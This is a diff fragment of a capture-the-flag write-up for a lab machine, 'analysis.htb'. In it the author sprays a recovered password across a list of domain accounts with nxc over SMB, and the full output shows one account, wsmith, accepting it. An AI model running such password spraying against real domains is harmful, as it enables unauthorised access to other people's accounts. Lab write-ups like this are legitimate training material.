@@ -516,4 +516,29 @@ DMrB8YUcC5%2
 
 Ill spray this password against the domain
 
-# Compromising ``
+# Compromising `wsmith`
+
+```python
+❯❯❯ nxc smb dc-analysis.analysis.htb -u users.txt -p 'DMrB8YUcC5%2' --continue-on-success
+SMB         10.129.230.179  445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\Administrateur:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\Invité:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\krbtgt:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\DC-ANALYSIS$:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\jdoe:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\soc_analyst:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\cwilliams:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\technician:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\webservice:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [+] analysis.htb\wsmith:DMrB8YUcC5%2 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\jangel:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\lzen:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\svc_web:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\amanson:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\badam:DMrB8YUcC5%2 STATUS_LOGON_FAILURE 
+```
+
+I have compromised `wsmith`
+
+
+
